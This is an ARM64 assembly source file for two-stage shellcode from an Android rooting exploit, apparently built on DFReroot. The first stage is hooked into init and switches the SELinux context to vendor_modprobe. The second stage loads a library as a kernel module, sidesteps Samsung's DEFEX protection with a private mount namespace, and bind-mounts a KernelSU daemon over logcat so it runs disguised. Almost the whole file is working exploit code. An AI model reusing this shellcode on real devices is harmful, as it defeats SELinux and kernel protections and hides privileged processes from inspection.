    .arch armv8-a

    .include "include.inc"

    .global stage1_start
    .global stage1_filename
    .global stage1_data
    .global stage1_len
    .global stage1_stage2_libname
    .global stage1_first_inst_copy
    .data


stage1_data:

stage1_filename:
L_filename:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/modprobe"

.ifdef DEBUG_LOG
logdw_path:
    .asciz "/dev/socket/logdw"
log_tag:
    .asciz "dfdbg"
msg_s1_mutex:
    .asciz "s1: mutex ok, forking"
.endif

    .balign 4

stage1_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0

    cbnz    w0, return

    // Detect init tid = 1
    // We need in thread 1 to use default ns
    mov     x8, SYS_gettid
    svc     0

    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
    mov     x0, -100
    // Must pass L_filename. If put stage1_filename, address is not determined until link time.
    adr     x1, L_filename
    // O_CREAT|O_EXCL|O_CLOEXEC
    movl     x2, 524480
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    logdbg msg_s1_mutex, logdw_path, log_tag

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id

    add     sp, sp, 16

    // returned tid on parent, zero on child
    cbnz    w0, return

    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    // O_WRONLY|O_CLOEXEC
    movl    x2, 524289
    mov     x8, #SYS_openat
    svc     0
    // x0 = fd
    // write selinux_ctx
    adr x1, selinux_ctx
    mov x2, selinux_ctx_end - selinux_ctx
    mov x8, #SYS_write
    svc 0
    // execute

    adr     x0, exe_path
    sub sp, sp, 16
    adr x1,exe_path
    str x1,[sp]
    str xzr,[sp,8]
    mov x1,sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0


my_loop:
    b my_loop

return:

    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

    // First instruction of original function.
stage1_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    // Back to original
    b       end
end:

stage1_end:
stage1_len:
    .word stage1_end - stage1_data


    .global stage2_start
    .global stage2_data
    .global stage2_len
    .global stage2_first_inst_copy
    .data

stage2_data:
executable_path:
    .asciz "/vendor/bin/modprobe"
lib_path:
    .asciz "/vendor/lib64/libstagefrighthw.so"
mod_args:
    .asciz ""
ksud_path:
    // Compiled in rather than passable: this string is the file stage 2 bind-mounts and execs once the
    // orphaned process has triggered the shellcode, so it has to name the path KsudStage actually
    // writes. Renamed from DFReroot's own /data/system/dfreroot-ksud, because both installs stage a
    // different daemon and one path would let either overwrite the other's. DfrDaemonPathTest holds
    // this string and that constant together.
    .asciz "/data/system/rmgnext-ksud"
logcat_path:
    .asciz "/system/bin/logcat"
root_path:
    .asciz "/"
mark_stage2:
    .asciz "/dev/dfm1"
mark_bind_ns:
    .asciz "/dev/dfm2"
mark_bind_ok:
    .asciz "/dev/dfm3"
mark_exec_fail:
    .asciz "/dev/dfm4"

.ifdef DEBUG_LOG
logdw_path2:
    .asciz "/dev/socket/logdw"
log_tag2:
    .asciz "dfdbg"
msg_s2_match:
    .asciz "s2: modprobe matched"
msg_s2_finit:
    .asciz "s2: finit_module called"
msg_s2_mount1:
    .asciz "s2: first mount ok"
msg_s2_bind:
    .asciz "s2: ksud bind mounted"
msg_s2_execfail:
    .asciz "s2: execve logcat failed"
msg_s2_fail:
    .asciz "s2: stage2 failed. exit."
.endif

// The command line the staged daemon is exec'd with, and it is only what that daemon's own clap
// definition declares: `late-load [--allow-shell] [--kmi KMI] [--package-name PACKAGE_NAME]`.
//
// DFReroot's argv is not ours to keep. Its shellcode passed
// `late-load --package-name me.weishu.kernelsu --stage-from <path>`, and both of those strings
// belong to the KernelSU fork its daemon was built from - the daemon it stages understands
// --stage-from, and its manager is the one at me.weishu.kernelsu. Ours stages a ReSukiSU/Next
// build, whose late-load takes neither: it answers
//
//     error: unexpected argument '--stage-from' found
//     Usage: ksud late-load --package-name <PACKAGE_NAME>
//
// and exits at argument parsing, before loading anything. The exploit still reported success,
// because its success marker only says the daemon was exec'd - so the run looked done and left a
// phone with no su on it. Nothing is passed at all now:
//
// - --stage-from is not a flag this daemon has. It stages itself by renaming
//   /data/local/tmp/.ksud-stage into /data/adb/ksud, a path compiled into its own code.
// - --package-name has a default built from the flavour the binary was compiled for, which is the
//   same flavour the app chooses when it stages this file. Naming one here would be a second
//   opinion, compiled in, that no test could keep true across flavours.
argv_prog:
    .asciz "logcat"
argv_late:
    .asciz "late-load"
timespec_req:
    .quad 1          /* tv_sec */
    .quad 0          /* tv_nsec */

    .align 4

stage2_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // x0 -> int argc
    ldr     w1, [x0]            // w1 = argc
    cbz     w1, matched      // argc == 0，直接开干

    // 假定 argv 按 8 字节对齐，位于 argc 后面
    // 即布局为: int argc; int pad; char *argv[argc];
    add     x2, x0, #8
    ldr     x3, [x2]            // x3 = argv[0]
    cbz     x3, return_now

    adr     x4, executable_path // x4 = expected path

strcmp_loop:
    ldrb    w5, [x3], #1
    ldrb    w6, [x4], #1
    cmp     w5, w6
    b.ne    return_now
    cbnz    w5, strcmp_loop     // 还没遇到 '\0'，继续比较

matched:
    // argv[0] == executable_path

    create_mark mark_stage2
    logdbg msg_s2_match, logdw_path2, log_tag2

    // open lib
    mov     x0, -100
    adr     x1, lib_path
    // O_RDONLY
    mov    x2, O_RDONLY
    mov     x8, #SYS_openat
    svc     0

    // finit_module
    adr x1, mod_args
    mov x2, xzr
    mov x8, #SYS_finit_module
    svc 0

    logdbg msg_s2_finit, logdw_path2, log_tag2

    sub sp, sp, 64

    // Bypass DEFEX by bind mount.
    movl x0, (CLONE_NEWNS)
    mov x8, #SYS_unshare
    svc 0
    cbnz w0, myexit // unshare failed: do nothing globally

    // mount(NULL, "/", NULL, MS_REC|MS_PRIVATE, NULL)
    mov x0, xzr
    adr x1, root_path
    mov x2, xzr
    movl x3, (MS_REC | MS_PRIVATE) // movl is a macro. Must put arguments in parentheses
    mov x4, xzr
    mov x8, #SYS_mount
    svc 0
    cbnz w0, myexit // not private: do NOT bind globally, spin instead

    create_mark mark_bind_ns

    logdbg msg_s2_mount1, logdw_path2, log_tag2
    
    // mount(ksud_path, logcat_path, NULL, MS_BIND, NULL)
    adr x9, ksud_path
    mov x0, x9
    adr x1, logcat_path
    mov x2, xzr
    mov x3, MS_BIND
    mov x4, xzr
    mov x8, #SYS_mount
    svc 0
    cbnz w0, myexit

    create_mark mark_bind_ok

    logdbg msg_s2_bind, logdw_path2, log_tag2

    // argv = [logcat, late-load, NULL]
    //
    // argv[0] is logcat rather than the daemon's name because this is the path the daemon is
    // bind-mounted over: the process is a logcat to everything that looks at it, which is the same
    // reason the bind mount exists.
    adr x0, argv_prog
    str x0, [sp]

    adr x0, argv_late
    str x0, [sp, 8]

    str xzr, [sp, 16]

    adr x0, logcat_path
    mov x1, sp
    mov x2, xzr
    mov x8, #SYS_execve
    svc 0

    create_mark mark_exec_fail

    logdbg msg_s2_execfail, logdw_path2, log_tag2

myexit:
    logdbg msg_s2_fail, logdw_path2, log_tag2
    mov x0, #1
    mov x8, #SYS_exit
    svc #0

return_now:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
stage2_first_inst_copy:
    stp x29, x30, [sp, #-0x30]!
    b end2
end2:

stage2_end:
stage2_len:
    .word stage2_end - stage2_data

